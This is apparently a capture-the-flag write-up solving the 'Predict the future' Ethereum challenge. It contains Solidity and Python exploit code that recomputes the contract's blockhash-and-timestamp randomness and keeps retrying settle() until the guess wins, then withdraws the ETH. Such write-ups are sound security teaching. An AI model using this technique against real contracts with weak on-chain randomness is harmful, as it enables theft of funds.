# Predict the future

## Objectives

> This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.

> Note that it is indeed possible to solve this challenge without losing any ether.

## Solution

We have to follow a few steps here:

1. Code and deploy a contract with at least 3 functions:
    + One that locks in the guess (calling `lockInGuess()`)
    + One that calls `settle()` but *only* if it *knows* the guess will work
    + One fallback function to receive ETH

2. The function that calls `settle()` is specially important, it has to generate the answer just like the PredictTheFutureChallenge contract, but it should only attempt to do this settle if the answer is equal to the guess made when we call `lockInGuess()`. I defined it as follows:

```js
function callSettle() public {
    // prevent the tx from continuing if the answer is not going to pass as correct
    uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
    require(answer == 0, "tx will fail and guesser will be overwritten");

    // make the guess and check if the challenge is complete, otherwise revert
    challenge.settle();
    require(challenge.isComplete(), "challenge not complete yet");
    

    // send funds to my address
    (bool success,) = msg.sender.call{value:address(this).balance}("");
    require(success, "call failed");
}
```

3. Iteratively call this `callSettle()` function until the guess goes through. I did it as follows:

```python
# call settle until it works, because `guess` is already 0
while True:
    # check if the challenge is completed
    result = predict_the_future.isComplete()
    print(f'The challenge is complete: {result}')
    if result:
        break
    
    # call settle
    try:
        attacker.callSettle(_from | {'allow_revert':True})
    except:
        pass

    # check if the guesser has been overwritten
    guesser = web3.eth.get_storage_at(predict_the_future.address, '0x').hex()
    print(f'The guesser is: {guesser}')
    if attacker.address[-40:].upper() != guesser[-40:].upper():
        print('guesser has been overwritten')
        break
```

Here I call the function until either the challenge is complete, or if the guesser changes to the null address. I had this last check because if I were to generate a different guess than what I coded in the attacker contract and the `settle()` function was successfully called, then we would have to call `lockInGuess()` again to make `guesser = msg.sender` and not the null address. This scenario, however, is probably not possible.

Eventually, after a few tries, the attempt will go through if it passes. This can still be done if the set of possible answers is larger than just 10, but it would probably take much longer (unless we get lucky).

## Submission transaction

https://ropsten.etherscan.io/tx/0xb065fda4383b65408dd6f021f12071a44b4d44d24106fd5be006287f2fee4d05
